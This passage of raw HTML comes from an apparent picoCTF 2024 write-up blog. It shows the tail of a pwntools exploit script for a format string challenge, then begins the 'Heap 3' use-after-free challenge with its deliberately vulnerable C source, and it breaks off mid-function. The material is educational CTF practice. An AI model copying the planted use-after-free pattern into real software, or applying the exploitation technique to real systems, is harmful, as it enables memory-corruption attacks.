style=\"color:#212121;--shiki-dark:#D6DEEB\">)\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">p\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">interactive\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">()\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">print\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">p.\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#B2CCD6\">recvuntil\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">?\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">'\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#D6DEEB\">))\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\u003C/code>\u003C/pre>\n\u003Cp>Running this we get success! Please check on your own remote instance.\u003C/p>\n\u003Cp>\u003Cimg src=\"/img/writeups/2024/picoCTF2024/formatstring02-1.png\" alt=\"Image of exploit success\">\u003C/p>\n\u003Cp>Resources:\u003C/p>\n\u003Ch3 id=\"heap-3\">Heap 3\u003C/h3>\n\u003Cblockquote>\n\u003Cp>This program mishandles memory. Can you exploit it to get the flag?\u003C/p>\n\u003Cp>Download the binary here.\u003C/p>\n\u003Cp>Download the source here.\u003C/p>\n\u003Cp>Connect with the challenge instance here: nc tethys.picoctf.net 65312\u003C/p>\n\u003C/blockquote>\n\u003Cp>This problem was intially a bit confusing, but in retrospect it was pretty easy.\u003C/p>\n\u003Cp>The problem gives us this hint: \u003Ccode>Check out \"use after free\"\u003C/code>\u003C/p>\n\u003Cp>Hmmm… what could “use after free” possibly mean and how does it relate to heap overflow?\nHeres the definition of “use after free”:\u003C/p>\n\u003Cp>\u003Ccode>Once free is called on an allocation, the allocator is free to re-allocate that chunk of memory in future calls to malloc if it so chooses. However if the program author isn't careful and uses the freed object later on, the contents may be corrupt (or even attacker controlled). This is called a use after free or UAF.\u003C/code>\u003C/p>\n\u003Cp>Let’s read the source code.\u003C/p>\n\u003Cpre class=\"astro-code astro-code-themes min-light night-owl\" style=\"background-color:#ffffff;--shiki-dark-bg:#011627;color:#24292eff;--shiki-dark:#d6deeb; overflow-x: auto; white-space: pre-wrap; word-wrap: break-word;\" tabindex=\"0\" data-language=\"c\">\u003Ccode>\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">#\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">include\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> &#x3C;\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">stdio.h\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">#\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">include\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> &#x3C;\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">stdlib.h\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">#\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">include\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> &#x3C;\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">string.h\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">>\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">#\u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">define\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> FLAGSIZE_MAX\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 64\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">//\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Create struct size 35\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">typedef\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\"> struct\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">  char\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> a\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">10\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">  char\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> b\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">10\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">  char\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> c\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">10\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">  char\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> flag\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">5\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">];\u003C/span>\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\"> //\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">we have to modify this \"area\" from bico to pico\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">} object;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">int\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> num_allocs;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">object \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">x;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">void\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> check_win\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">//\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\">just need to change it from bico to pico\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">  if\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">!\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">strcmp\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">x\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">->\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">flag\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">pico\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">) {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">YOU WIN!!11!!\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">    //\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Print flag\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">    char\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#C5E478\"> buf\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">[FLAGSIZE_MAX];\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    FILE \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">fd \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> fopen\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">flag.txt\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">r\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    fgets\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(buf\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\"> FLAGSIZE_MAX\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\"> fd)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">%s\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\"> buf)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    fflush\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(stdout)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    exit\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\">0\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">  } \u003C/span>\u003Cspan style=\"color:#D32F2F;font-style:inherit;--shiki-dark:#C792EA;--shiki-dark-font-style:italic\">else\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">No flage for u :(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    fflush\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(stdout)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">  }\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">  //\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Call function in struct\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">void\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> print_menu\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">1. Print Heap\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">2. Allocate object\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">3. Print x->flag\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">4. Check for win\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">5. Free x\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">6. \u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">           \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Exit\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Enter your choice: \u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    fflush\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(stdout)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#C2C3C5;--shiki-dark:#637777\">//\u003C/span>\u003Cspan style=\"color:#C2C3C5;font-style:inherit;--shiki-dark:#637777;--shiki-dark-font-style:italic\"> Create a struct\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">void\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> init\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">freed but still in use\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">now memory untracked\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">do you smell the bug?\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#F78C6C\">\\n\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    fflush\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(stdout)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">    x \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> malloc\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">sizeof\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(object))\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    strncpy\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#C5E478\">x\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">->\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#C5E478\">flag\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\"> \"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">bico\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 5\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">}\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">void\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> alloc_object\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">() {\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#ECC48D\">Size of object allocation: \u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    fflush\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(stdout)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">    int\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> size \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#F78C6C\"> 0\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    scanf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#1976D2;--shiki-dark:#82AAFF\">%d\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan style=\"color:#212121;--shiki-dark:#82AAFF\">,\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\"> &#x26;\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">size)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">    char\u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#7FDBCA\">*\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\"> alloc \u003C/span>\u003Cspan style=\"color:#D32F2F;--shiki-dark:#C792EA\">=\u003C/span>\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\"> malloc\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(size)\u003C/span>\u003Cspan style=\"color:#24292EFF;--shiki-dark:#D6DEEB\">;\u003C/span>\u003C/span>\n\u003Cspan class=\"line\">\u003Cspan style=\"color:#6F42C1;font-style:inherit;--shiki-dark:#82AAFF;--shiki-dark-font-style:italic\">    printf\u003C/span>\u003Cspan style=\"color:#6F42C1;--shiki-dark:#82AAFF\">(\u003C/span>\u003Cspan style=\"color:#22863A;--shiki-dark:#D9F5DD\">\"\u003C/span>\u003Cspan 